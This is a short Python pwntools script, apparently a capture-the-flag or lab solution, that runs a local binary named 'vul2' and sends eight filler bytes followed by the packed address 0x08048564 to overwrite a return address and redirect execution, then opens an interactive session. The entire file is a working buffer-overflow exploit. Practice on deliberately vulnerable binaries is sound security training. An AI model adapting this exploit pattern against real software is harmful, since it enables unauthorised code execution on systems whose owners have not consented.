#!/usr/bin/env python
from pwn import *

p = process('./vul2');

hack = 0x08048564

payload = 'A' * 8 + p32(hack);

p.send(payload)

p.interactive()


